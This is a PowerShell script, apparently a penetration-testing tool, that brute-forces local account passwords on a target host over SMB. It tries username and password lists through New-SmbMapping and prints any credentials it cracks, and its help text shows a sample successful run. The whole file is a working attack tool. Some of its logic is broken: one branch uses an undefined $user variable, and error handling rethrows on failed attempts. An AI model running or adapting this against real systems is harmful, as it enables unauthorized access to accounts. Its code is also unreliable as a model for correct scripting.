function Invoke-SMBBruteForce

{
<#
.SYNOPSIS

    This will use SMB to brute force a specific account when pointed at a local target. 
    
.DESCRIPTION

    Author: Wbbigdave
    License: GNU GPL v3
    Required Dependancies: None
    Optional Dependancies: None
    Version: 1.0


.Example

    PS C:\> Invoke-SMBBruteForce -Target 192.168.0.10 -Username "admin" -PasswordFile password.txt

    [*]Trying to authenticate against \\192.168.0.10
    [*]Loaded 2000 passwords from password file.
    [*]Starting brute force operation.
    [*]Success! Password for admin is ilovemushrooms
    [*]Completed.

 .Parameter Target

    A single target host, either an IP address or a hostname. 

.Parameter Username

    A single username in plaintext to be brute forced. This should be a loacl user account. 

.Parameter UsernameFile

    A file on the local host which contains a list of usernames. This can either be in txt line separated, or CSV comma
    separated.     

.Parameter Password

    A comma separated list of passwords to use against the target account. 

.Parameter PasswordFile

    A file on the local host which contains a list of passwords. This can either be in txt line separated, or CSV comma
    separated. 

#>


    [CmdletBinding(DefaultParameterSetName = "Plain")] Param(

    [Parameter(Mandatory=$true)]
    [String] $Target,

    [Parameter(ParameterSetName = "Files", mandatory=$false)]
    [Parameter(ParameterSetName = "Plain", Mandatory=$true)]
    [String] $Username,

    [Parameter(ParameterSetName = "Files", mandatory=$false)]
    [String] $UsernameFile,

    [Parameter(ParameterSetName = "Files", mandatory=$false)]
    [Parameter(ParameterSetName = "Plain", Mandatory=$true)]
    [String] $Password,

    [Parameter(ParameterSetName = "Files", mandatory=$false)]
    [String] $PasswordFile
    )

    Process
    {
        $Counter = 0
        Write-Host "[*]Trying to authenticate against \\$target"

        Write-Host "[*]Starting Brute Force Operation"
            if(!$Username)
            {
                $UserFileLength = (Get-Content $UsernameFile).Length
                Write-Host "[*]Loaded $UserFileLength from $UsernameFile"
                foreach($user in get-content $UsernameFile)
                {
                $u = "$target\$user"
                    if(!$PasswordFile)
                    {
                        try 
                        {
                             $valid = new-smbmapping -remotepath \\$target -username $u -password $Password
                             if($valid)
                             {
                                Write-Host "[*]Success! Password for $u is $Password"
                                }
                        }
                        catch 
                        {
                             write-host "Unknown error Occured"
                             throw
                        }

                    }
                    else
                    {
                        $PasswordFileLength = (get-content $PasswordFile).Length
                        Write-Host "[*]Loaded $PasswordFileLength passwords from $PasswordFile"
                        foreach($pw in get-content $PasswordFile)
                        {
                            try
                            {
                                $valid = new-smbmapping -remotepath \\$target -username $u -password $pw
                                $valid
                                if($valid)
                                {
                                write-host "[*]Success! Password for $u is $pw"
                                }
                            }
                            catch
                            {
                                Write-Host "Unknown Error Occured"
                                throw
                            }
                        }
                    }
                
                }
            }
            else
            {
                $u = "$Target\$Username"
                Write-Host "[*]Attempting to brute force $target with the username $u "
                Write-Host "[*] Starting Brute Force Operation"
                if(!$PasswordFile)
                {
                    try 
                    {
                         $valid = new-smbmapping -remotepath \\$target -username $u -password $Password 
                         if($valid)
                         {
                            write-host "[*]Success! Password for $u is $Password"
                            }
                    }
                    catch 
                    {
                         write-host "Unknown error Occured"
                         throw
                    }

                }
                else
                {
                    $PasswordFileLength = (get-content $PasswordFile).Length
                    Write-Host "[*]Loaded $PasswordFileLength passwords from $PasswordFile"
                    foreach($pw in get-content $PasswordFile)
                    {
                        try
                        {
                            $valid = new-smbmapping -remotepath \\$target -username $user -password $pw -EA SilentlyContinue
                            if($valid)
                            {
                                Write-Host "[*]Success! Password for $u is $pw"
                                }
                        }
                        catch
                        {
                            Write-Host "Unknown Error Occured"
                            throw
                        }
                    }
                }
            
            }
        }
    

}
 
